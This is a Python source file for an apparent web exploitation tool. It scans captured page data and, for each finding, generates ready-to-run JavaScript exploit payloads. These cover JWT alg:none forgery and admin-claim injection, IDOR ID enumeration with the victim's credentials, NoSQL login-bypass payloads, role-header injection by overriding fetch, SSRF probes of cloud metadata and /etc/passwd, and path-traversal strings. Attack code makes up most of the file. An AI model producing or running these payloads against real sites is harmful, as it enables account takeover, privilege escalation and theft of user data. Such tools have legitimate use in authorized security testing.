# analyzer.py
"""
Advanced Analyzer - Detects modern authentication bypass vulnerabilities
"""

import re
import json
import base64
from bs4 import BeautifulSoup, Comment
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode

try:
    import jwt
    JWT_AVAILABLE = True
except ImportError:
    JWT_AVAILABLE = False


class Analyzer:
    def __init__(self, page_data: Dict[str, Any], use_llm: bool = True):
        self.page_data = page_data
        self.use_llm = use_llm
        self.candidates = []
        self._load_config()

    def _load_config(self):
        """Load configuration from config.py"""
        try:
            from config import (
                ENABLE_JWT_TESTS, ENABLE_IDOR_TESTS, ENABLE_ROLE_HEADER_TESTS,
                ENABLE_GRAPHQL_TESTS, ENABLE_NOSQL_TESTS, ENABLE_SSRF_TESTS,
                ENABLE_PATH_TRAVERSAL, IDOR_PATTERNS, ROLE_HEADERS,
                JWT_CLAIM_INJECTION, GRAPHQL_COMMON_PATHS
            )
            self.enable_jwt = ENABLE_JWT_TESTS
            self.enable_idor = ENABLE_IDOR_TESTS
            self.enable_role_headers = ENABLE_ROLE_HEADER_TESTS
            self.enable_graphql = ENABLE_GRAPHQL_TESTS
            self.enable_nosql = ENABLE_NOSQL_TESTS
            self.enable_ssrf = ENABLE_SSRF_TESTS
            self.enable_path_traversal = ENABLE_PATH_TRAVERSAL
            self.idor_patterns = IDOR_PATTERNS
            self.role_headers = ROLE_HEADERS
            self.jwt_claims = JWT_CLAIM_INJECTION
            self.graphql_paths = GRAPHQL_COMMON_PATHS
        except ImportError:
            # Default values if config not updated
            self.enable_jwt = self.enable_idor = self.enable_role_headers = True
            self.enable_graphql = self.enable_nosql = True
            self.enable_ssrf = self.enable_path_traversal = True
            self.idor_patterns = [r'/(?:user|account|profile)/(\d+)', r'[?&]id=(\d+)']
            self.role_headers = ["X-Role", "X-Admin", "X-User-Role"]
            self.jwt_claims = ["admin", "isAdmin", "role"]
            self.graphql_paths = ["/graphql", "/v1/graphql"]

    def extract_candidates(self) -> List[Dict[str, Any]]:
        """Extract all potential vulnerability candidates"""
        self.candidates = []
        
        # Legacy detection (original functionality)
        self._detect_commented_elements()
        self._detect_hidden_elements()
        self._detect_postback_calls()
        
        # MODERN DETECTIONS
        if self.enable_jwt:
            self._detect_jwt_tokens()
        
        if self.enable_idor:
            self._detect_idor_candidates()
        
        if self.enable_graphql:
            self._detect_graphql_endpoints()
        
        if self.enable_nosql:
            self._detect_nosql_candidates()
        
        if self.enable_role_headers:
            self._detect_role_header_candidates()
        
        if self.enable_ssrf:
            self._detect_ssrf_candidates()
        
        if self.enable_path_traversal:
            self._detect_path_traversal_candidates()
        
        # API endpoint discovery
        self._detect_api_endpoints()
        
        print(f"[DEBUG] Total candidates found: {len(self.candidates)}")
        return self.candidates

    def _detect_jwt_tokens(self):
        """Detect JWT tokens in cookies, headers, localStorage, and URLs"""
        jwt_pattern = r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'
        
        # Check cookies
        for cookie in self.page_data.get("cookies", []):
            if re.search(jwt_pattern, cookie.get('value', '')):
                self._add_jwt_candidate(cookie['value'], 'cookie', cookie['name'])
        
        # Check localStorage
        local_storage = self.page_data.get("local_storage", "{}")
        try:
            storage_data = json.loads(local_storage) if local_storage else {}
            for key, value in storage_data.items():
                if isinstance(value, str) and re.search(jwt_pattern, value):
                    self._add_jwt_candidate(value, 'localStorage', key)
        except:
            pass
        
        # Check API requests
        for req in self.page_data.get("api_requests", []):
            auth_header = req.get('headers', {}).get('Authorization', '')
            if 'Bearer' in auth_header and re.search(jwt_pattern, auth_header):
                token = auth_header.split('Bearer')[-1].strip()
                self._add_jwt_candidate(token, 'authorization_header', None)
            
            # Check response bodies
            response_body = req.get('response_body', '')
            if response_body and re.search(jwt_pattern, response_body):
                matches = re.findall(jwt_pattern, response_body)
                for token in matches:
                    self._add_jwt_candidate(token, 'api_response', req.get('url'))

    def _add_jwt_candidate(self, token: str, source: str, location: str):
        """Add JWT candidate with exploitation strategies"""
        exploit_js = f"""
        // JWT Manipulation for {source}
        // Original token: {token[:50]}...
        
        // Strategy 1: alg:none attack
        function testJWTNone(token) {{
            var parts = token.split('.');
            if (parts.length === 3) {{
                var header = JSON.parse(atob(parts[0]));
                header.alg = 'none';
                var fakeHeader = btoa(JSON.stringify(header));
                var fakeToken = fakeHeader + '.' + parts[1] + '.';
                return fakeToken;
            }}
            return token;
        }}
        
        // Strategy 2: Add admin claim
        function injectAdminClaim(token) {{
            var parts = token.split('.');
            if (parts.length === 3) {{
                var payload = JSON.parse(atob(parts[1]));
                payload.admin = true;
                payload.isAdmin = true;
                payload.role = 'admin';
                var newPayload = btoa(JSON.stringify(payload));
                return parts[0] + '.' + newPayload + '.' + parts[2];
            }}
            return token;
        }}
        
        // Apply in browser console or API requests
        console.log('JWT found! Test with:');
        console.log('  alg:none: ' + testJWTNone('{token[:30]}...'));
        console.log('  admin claim: ' + injectAdminClaim('{token[:30]}...'));
        """
        
        self.candidates.append({
            "type": "jwt_token",
            "source": source,
            "location": location,
            "token_preview": token[:100] + "...",
            "severity": "high",
            "exploit_js": exploit_js,
            "exploit_description": "JWT token found. Test alg:none attack and admin claim injection."
        })

    def _detect_idor_candidates(self):
        """Detect potential IDOR vulnerabilities in URLs and API requests"""
        seen_ids = set()
        
        # Check current page URL
        current_url = self.page_data.get("url", "")
        for pattern in self.idor_patterns:
            matches = re.findall(pattern, current_url, re.IGNORECASE)
            for match in matches:
                if match.isdigit() and match not in seen_ids:
                    seen_ids.add(match)
                    self._add_idor_candidate(current_url, match, 'url_parameter')
        
        # Check API requests
        for req in self.page_data.get("api_requests", []):
            url = req.get('url', '')
            for pattern in self.idor_patterns:
                matches = re.findall(pattern, url, re.IGNORECASE)
                for match in matches:
                    if str(match).isdigit() and match not in seen_ids:
                        seen_ids.add(match)
                        self._add_idor_candidate(url, match, 'api_request', req.get('method'))

    def _add_idor_candidate(self, url: str, id_value: str, source: str, method: str = "GET"):
        """Add IDOR candidate with exploitation strategies"""
        exploit_js = f"""
        // IDOR Test for {url}
        // Current ID: {id_value}
        
        // Test different IDs
        const testIds = [1, 2, 3, 999, 1000];
        for (const id of testIds) {{
            const testUrl = '{url}'.replace(/{id_value}/, id);
            fetch(testUrl, {{
                method: '{method}',
                credentials: 'include'
            }}).then(r => r.json()).then(data => {{
                if (data && Object.keys(data).length > 0) {{
                    console.log(`IDOR Success! ID ${{id}} returned data`);
                }}
            }});
        }}
        
        // For POST requests, try modifying body
        // For path-based IDs, try ../ traversal
        """
        
        self.candidates.append({
            "type": "idor",
            "source": source,
            "endpoint": url,
            "id_value": id_value,
            "method": method,
            "severity": "medium",
            "exploit_js": exploit_js,
            "exploit_description": f"IDOR candidate at {url} with ID {id_value}. Test with different IDs."
        })

    def _detect_graphql_endpoints(self):
        """Detect GraphQL endpoints and prepare introspection queries"""
        base_url = self.page_data.get("url", "")
        base_domain = urlparse(base_url).scheme + "://" + urlparse(base_url).netloc
        
        for path in self.graphql_paths:
            gql_url = base_domain + path
            self.candidates.append({
                "type": "graphql_endpoint",
                "source": "detected",
                "endpoint": gql_url,
                "severity": "medium",
                "exploit_js": self._generate_graphql_introspection(gql_url),
                "exploit_description": f"GraphQL endpoint found at {gql_url}. Run introspection query to discover schema."
            })

    def _generate_graphql_introspection(self, endpoint: str) -> str:
        """Generate GraphQL introspection and exploitation queries"""
        return f"""
        // GraphQL Introspection Query for {endpoint}
        const introspectionQuery = `{{
          __schema {{
            types {{
              name
              fields {{
                name
                type {{
                  name
                  kind
                }}
              }}
            }}
          }}
        }}`;
        
        // Run introspection
        fetch('{endpoint}', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({{ query: introspectionQuery }})
        }}).then(r => r.json()).then(data => {{
            if (data.data && data.data.__schema) {{
                console.log('GraphQL schema exposed!', data.data.__schema.types);
            }}
        }});
        
        // Query for sensitive data
        const adminQuery = `{{
          users {{
            id
            username
            email
            password
            role
          }}
          admin {{
            secretKey
            apiKeys
          }}
        }}`;
        """

    def _detect_nosql_candidates(self):
        """Detect NoSQL injection candidates in login forms and parameters"""
        html = self.page_data.get("html", "")
        soup = BeautifulSoup(html, 'html.parser')
        
        # Find login forms
        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action', '')
            inputs = form.find_all('input')
            usernames = [i for i in inputs if i.get('name', '').lower() in ['username', 'email', 'user']]
            passwords = [i for i in inputs if i.get('name', '').lower() in ['password', 'pass']]
            
            if usernames and passwords:
                self.candidates.append({
                    "type": "nosql_injection",
                    "source": "login_form",
                    "action": action or self.page_data.get("url"),
                    "severity": "high",
                    "exploit_js": self._generate_nosql_payloads(),
                    "exploit_description": "NoSQL injection possible in login form. Test with $ne, $gt operators."
                })

    def _generate_nosql_payloads(self) -> str:
        """Generate NoSQL injection payloads"""
        return """
        // NoSQL Injection Payloads for Login Bypass
        
        const payloads = [
            { username: {"$ne": null}, password: {"$ne": null} },
            { username: {"$gt": ""}, password: {"$gt": ""} },
            { username: "admin", password: {"$regex": "^.*$"} },
            { username: "admin' || '1'=='1", password: "anything" },
            { username: {"$ne": "invalid"}, password: {"$ne": "invalid"} }
        ];
        
        async function testNoSQL(endpoint) {
            for (const payload of payloads) {
                const response = await fetch(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                if (response.url.includes('dashboard') || response.url.includes('admin')) {
                    console.log('NoSQL Bypass Successful!', payload);
                }
            }
        }
        """

    def _detect_role_header_candidates(self):
        """Detect opportunities for role header injection"""
        # Check if app uses custom headers in requests
        api_requests = self.page_data.get("api_requests", [])
        custom_headers = set()
        
        for req in api_requests:
            for header in req.get('headers', {}).keys():
                if header.startswith('X-') or header in ['Authorization', 'Api-Key']:
                    custom_headers.add(header)
        
        for header in self.role_headers:
            self.candidates.append({
                "type": "role_header_injection",
                "source": "suggested",
                "header_name": header,
                "existing_headers": list(custom_headers),
                "severity": "medium",
                "exploit_js": self._generate_role_header_payload(header),
                "exploit_description": f"Try injecting {header}: admin to escalate privileges."
            })

    def _generate_role_header_payload(self, header_name: str) -> str:
        """Generate role header injection code"""
        return f"""
        // Role Header Injection Test
        // Try injecting {header_name}: admin
        
        const testValues = ['admin', 'administrator', 'superadmin', 'root', '1', 'true'];
        
        // Intercept and modify requests
        const originalFetch = window.fetch;
        window.fetch = function(url, options) {{
            options = options || {{}};
            options.headers = options.headers || {{}};
            for (const val of testValues) {{
                options.headers['{header_name}'] = val;
                console.log(`Testing {header_name}: ${{val}} on ${{url}}`);
            }}
            return originalFetch(url, options);
        }};
        
        // Refresh page to apply
        location.reload();
        """

    def _detect_ssrf_candidates(self):
        """Detect SSRF candidates in parameters"""
        # Look for URL parameters that accept URLs
        current_url = self.page_data.get("url", "")
        parsed = urlparse(current_url)
        params = parse_qs(parsed.query)
        
        url_params = ['url', 'uri', 'path', 'redirect', 'next', 'return', 'callback', 'webhook', 'image', 'src', 'source']
        
        for param in url_params:
            if param in params:
                self.candidates.append({
                    "type": "ssrf",
                    "source": "url_parameter",
                    "parameter": param,
                    "current_value": params[param][0] if params[param] else None,
                    "severity": "high",
                    "exploit_js": self._generate_ssrf_payload(),
                    "exploit_description": f"SSRF candidate in {param} parameter. Test internal endpoints."
                })

    def _generate_ssrf_payload(self) -> str:
        """Generate SSRF test payloads"""
        return """
        // SSRF Test Payloads
        const ssrfTargets = [
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'http://127.0.0.1:8080/admin',
            'http://localhost:22',
            'file:///etc/passwd',
            'http://internal-api/health'
        ];
        
        async function testSSRF(baseUrl, paramName) {
            for (const target of ssrfTargets) {
                const testUrl = baseUrl + '?' + paramName + '=' + encodeURIComponent(target);
                const response = await fetch(testUrl);
                const text = await response.text();
                if (text.includes('root:') || text.includes('secret') || response.status === 200) {
                    console.log(`SSRF Success: ${target} returned data`);
                }
            }
        }
        """

    def _detect_path_traversal_candidates(self):
        """Detect path traversal candidates"""
        # Check for file parameters
        current_url = self.page_data.get("url", "")
        parsed = urlparse(current_url)
        params = parse_qs(parsed.query)
        
        file_params = ['file', 'document', 'path', 'page', 'template', 'include', 'load']
        
        for param in file_params:
            if param in params:
                self.candidates.append({
                    "type": "path_traversal",
                    "source": "url_parameter",
                    "parameter": param,
                    "severity": "high",
                    "exploit_js": self._generate_path_traversal_payload(),
                    "exploit_description": f"Path traversal candidate in {param} parameter."
                })

    def _generate_path_traversal_payload(self) -> str:
        """Generate path traversal payloads"""
        return """
        // Path Traversal Payloads
        const traversalPayloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '....//....//....//etc/passwd',
            '..;/..;/..;/etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ];
        
        async function testPathTraversal(baseUrl, paramName) {
            for (const payload of traversalPayloads) {
                const testUrl = baseUrl + '?' + paramName + '=' + encodeURIComponent(payload);
                const response = await fetch(testUrl);
                const text = await response.text();
                if (text.includes('root:x:') || text.includes('[extensions]')) {
                    console.log(`Path Traversal Success: ${payload}`);
                }
            }
        }
        """

    def _detect_api_endpoints(self):
        """Detect API endpoints from captured traffic"""
        api_endpoints = self.page_data.get("api_endpoints", [])
        api_requests = self.page_data.get("api_requests", [])
        
        all_endpoints = set(api_endpoints)
        for req in api_requests:
            all_endpoints.add(req.get('url', ''))
        
        for endpoint in list(all_endpoints)[:10]:  # Limit to 10
            self.candidates.append({
                "type": "api_endpoint",
                "source": "discovered",
                "endpoint": endpoint,
                "severity": "info",
                "exploit_js": f"// Test endpoint: {endpoint}\n// Try GET, POST, PUT, DELETE methods",
                "exploit_description": f"Discovered API endpoint: {endpoint}. Test for access control issues."
            })

    def _detect_commented_elements(self):
        """Original: Find HTML comments with hidden elements"""
        html = self.page_data.get("html", "")
        soup = BeautifulSoup(html, 'html.parser')
        
        comments = soup.find_all(string=lambda text: isinstance(text, Comment))
        for comment in comments:
            comment_str = str(comment)
            if re.search(r'<(?:input|button|a)', comment_str, re.I):
                id_match = re.search(r'(?:id|name)=["\']([^"\']+)["\']', comment_str, re.I)
                if id_match:
                    element_id = id_match.group(1)
                    self.candidates.append({
                        "type": "commented_element",
                        "source": "html_comment",
                        "element_id": element_id,
                        "code_snippet": comment_str[:200],
                        "exploit_js": f"__doPostBack('{element_id}', '');",
                        "severity": "medium"
                    })

    def _detect_hidden_elements(self):
        """Original: Find hidden or disabled elements"""
        html = self.page_data.get("html", "")
        soup = BeautifulSoup(html, 'html.parser')
        
        for element in soup.find_all(['input', 'button', 'a']):
            style = element.get('style', '')
            is_hidden = (element.get('type') == 'hidden' or 
                         'display:none' in style or 
                         'visibility:hidden' in style or
                         element.get('hidden') is not None)
            is_disabled = element.get('disabled') is not None
            if is_hidden or is_disabled:
                element_id = element.get('id') or element.get('name')
                if element_id:
                    self.candidates.append({
                        "type": "hidden_or_disabled",
                        "source": "dom",
                        "element_id": element_id,
                        "element_html": str(element)[:200],
                        "exploit_js": f"document.getElementById('{element_id}').click();",
                        "severity": "low"
                    })

    def _detect_postback_calls(self):
        """Original: Find __doPostBack calls"""
        html = self.page_data.get("html", "")
        if "__doPostBack" in html:
            patterns = [
                r'__doPostBack\(["\']([^"\']+)["\'],\s*["\']([^"\']+)["\']\)',
                r"__doPostBack\(['\"]([^'\"]+)['\"],\s*['\"]([^'\"]+)['\"]\)",
                r'__doPostBack\(([^,]+),\s*([^)]+)\)'
            ]
            for pattern in patterns:
                matches = re.findall(pattern, html)
                for match in matches:
                    target = match[0].strip(' "\'')
                    arg = match[1].strip(' "\'')
                    self.candidates.append({
                        "type": "postback",
                        "source": "html",
                        "target": target,
                        "argument": arg,
                        "exploit_js": f"__doPostBack('{target}', '{arg}');",
                        "severity": "low"
                    })

    async def llm_filter(self, candidates: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Filter candidates using LLM (kept for compatibility)"""
        if not self.use_llm or not candidates:
            for cand in candidates:
                cand["llm_verdict"] = True
                cand["llm_reason"] = "LLM disabled - testing all candidates"
            return candidates
        
        # LLM integration placeholder - can be implemented with OpenAI/Ollama
        for cand in candidates:
            cand["llm_verdict"] = True
            cand["llm_reason"] = "LLM integration not yet fully implemented"
        
        return candidates

    async def run(self) -> List[Dict[str, Any]]:
        candidates = self.extract_candidates()
        candidates = await self.llm_filter(candidates)
        return candidates